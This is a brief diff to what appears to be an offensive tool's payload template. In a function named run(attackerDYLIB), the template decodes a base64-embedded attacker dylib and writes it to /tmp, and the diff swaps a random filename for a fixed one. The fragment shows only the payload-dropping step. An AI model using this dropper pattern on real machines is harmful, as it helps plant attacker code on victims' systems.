@@ -535,8 +535,7 @@ def run(attackerDYLIB):
 import base64
 import uuid
 encbytes = "%s"
-filename = str(uuid.uuid4())
-path = "/tmp/" + filename + ".dylib"
+path = "/tmp/temporary.dylib"
 decodedDylib = base64.b64decode(encbytes)
 temp = open(path,'wb')
 temp.write(decodedDylib)
